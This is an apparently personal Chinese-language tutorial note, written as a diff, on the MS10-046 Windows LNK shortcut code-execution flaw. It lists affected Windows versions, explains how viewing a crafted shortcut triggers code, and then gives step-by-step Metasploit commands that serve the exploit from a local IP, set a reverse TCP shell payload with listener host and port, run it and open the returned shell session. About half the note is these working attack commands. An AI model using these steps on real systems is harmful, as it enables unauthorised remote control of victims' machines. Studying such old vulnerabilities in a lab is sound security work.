@@ -1,0 +1,37 @@
+微软快捷方式LNK文件自动执行代码漏洞(MS10-046)
+受影响：
+window XP SP2
+Window Vista SP2
+Window Vista SP1
+window server 2008 R2
+window server 2003 SP2
+win7
+
+win支持使用快捷方式或LNK文件。LNK时指向本地文件的引用，
+点击LNK文件与快捷方式所指定的目标具有相同的效果。
+
+Window没有正确地出路LNK文件，特质的LNK文件可能导致Window
+自动执行快捷方式文件锁指定的代码。这些代码可能位于USB驱动
+、本地或远程文件系统、光驱或其他位置，使用资源管理器查看LNK文件
+所在位置就足以触发这个漏洞。默认下Window启动了自动加载和自动播放功能，
+因此在连接可移动设备（如USB内存）后window会自动打开资源管理器。
+其他显示文件图标的应用也可用作这个漏洞的攻击载体。这个漏洞常用于传播恶意软件。
+
+
+search ms10_046
+use window/browser/ms10_046_shortcut_icon_dllloader
+show options
+set SRVHOST 192.168.2.128
+set SRVPORT 80
+set payload window/shell/reverse_tcp
+set LHOST 192.168.2.128
+set LPORT 444
+show targets  查看版本
+exploit
+主机访问后
+sessions -i
+sessions -i 3 返回shell
+
+
+
+
